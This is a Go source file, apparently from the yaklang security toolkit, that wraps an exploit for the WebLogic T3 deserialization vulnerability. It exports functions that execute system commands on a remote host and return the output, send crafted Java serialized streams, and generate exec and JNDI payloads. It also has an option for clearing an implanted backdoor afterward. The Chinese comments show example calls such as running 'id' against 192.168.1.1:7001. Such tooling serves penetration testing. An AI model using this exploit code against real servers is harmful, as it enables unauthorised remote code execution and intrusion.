package t3

import (
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
)

// OptionFun 是 T3 利用相关函数的配置选项类型，由 t3.timeout、t3.clearBackdoor、t3.debugHandler 等生成
type OptionFun func(*T3Paylaod)

// ExecCommand 通过 Weblogic T3 协议反序列化漏洞在目标上执行命令并回显结果
// 参数:
//   - addr: 目标地址，格式为 host:port
//   - cmd: 要执行的系统命令
//   - f: 可选配置，例如 t3.timeout、t3.clearBackdoor、t3.debugHandler
//
// 返回值:
//   - 命令执行的回显结果
//   - 错误信息，连接或利用失败时返回非空
//
// Example:
// ```
// // 通过 T3 协议执行命令，依赖存在漏洞的目标，此处仅作示意
// result, err = t3.ExecCommand("192.168.1.1:7001", "id", t3.timeout(10))
// println(result)
// ```
func _execT3(addr string, cmd string, f ...OptionFun) (string, error) {
	f = append(f, SetAddr(addr))
	var payload = NewT3Payload(f...)
	var result, err = payload.Exec(cmd)
	if err != nil {
		return "", utils.Errorf("paylaod exec failed: %s", err)
	}
	return result, nil
}

// SendJavaObjectStreamBytes 通过 T3 协议向目标发送原始的 Java 序列化对象字节流
// 参数:
//   - addr: 目标地址，格式为 host:port
//   - acedBytes: 要发送的 Java 序列化对象字节流（以 0xACED 开头）
//   - f: 可选配置，例如 t3.timeout、t3.debugHandler
//
// 返回值:
//   - 错误信息，发送失败时返回非空
//
// Example:
// ```
// // 发送自定义 Java 序列化字节流，依赖目标，此处仅作示意
// payload = t3.GenerateJavaObjectStreamBytes("touch /tmp/x")~
// t3.SendJavaObjectStreamBytes("192.168.1.1:7001", payload, t3.timeout(10))~
// ```
func SendSreamBytes(addr string, acedBytes interface{}, f ...OptionFun) error {
	f = append(f, SetAddr(addr))
	var payload = NewT3Payload(f...)
	return payload.SendPayload(utils.InterfaceToBytes(acedBytes))
}

func SetAddr(addr string) OptionFun {
	return func(t *T3Paylaod) {
		host, port, err := utils.ParseStringToHostPort(addr)
		if err != nil {
			log.Errorf("parse [%s] failed: %s", addr, err)
			return
		}
		t.Ip, t.Port = host, port
	}

}

// timeout 是一个 T3 利用配置选项，用于设置网络操作的超时时间（单位：秒）
// 参数:
//   - duration: 超时时间，单位为秒，支持小数
//
// 返回值:
//   - 一个 T3 利用配置选项，作为可变参数传入 t3.ExecCommand 等函数
//
// Example:
// ```
// // 设置 T3 操作超时，此处仅作示意
// result, err = t3.ExecCommand("192.168.1.1:7001", "id", t3.timeout(10))
// println(result)
// ```
func SetTimeout(duration float64) OptionFun {
	return func(t *T3Paylaod) {
		t.timeout = utils.FloatSecondDuration(duration)
	}
}

// clearBackdoor 是一个 T3 利用配置选项，用于设置是否在利用后清理植入的后门对象
// 参数:
//   - clear: 是否清理后门
//
// 返回值:
//   - 一个 T3 利用配置选项，作为可变参数传入 t3.ExecCommand 等函数
//
// Example:
// ```
// // 利用后自动清理后门，此处仅作示意
// result, err = t3.ExecCommand("192.168.1.1:7001", "id", t3.clearBackdoor(true))
// println(result)
// ```
func SetClearBackdoor(clear bool) OptionFun {
	return func(paylaod *T3Paylaod) {
		paylaod.clearBackdoor = clear
	}
}

// debugHandler 是一个 T3 利用配置选项，用于设置调试回调以观察利用过程的中间数据
// 参数:
//   - handler: 调试回调函数，接收过程中的调试字符串
//
// 返回值:
//   - 一个 T3 利用配置选项，作为可变参数传入 t3.ExecCommand 等函数
//
// Example:
// ```
// // 设置调试回调观察 T3 利用过程，此处仅作示意
// result, err = t3.ExecCommand("192.168.1.1:7001", "id", t3.debugHandler(func(s) { println(s) }))
// println(result)
// ```
func SetDebugHandler(handler func(string)) OptionFun {
	return func(paylaod *T3Paylaod) {
		paylaod.handler = handler
	}
}

var GenExecPayload = genPayload
var Exports = map[string]interface{}{
	"ExecCommand":                   _execT3,
	"SendJavaObjectStreamBytes":     SendSreamBytes,
	"GenerateJavaObjectStreamBytes": GenExecPayload,
	"GenerateWeblogicJNDIPayload":   GenerateWeblogicJNDIPayload,
	"timeout":                       SetTimeout,
	"clearBackdoor":                 SetClearBackdoor,
	"debugHandler":                  SetDebugHandler,
}
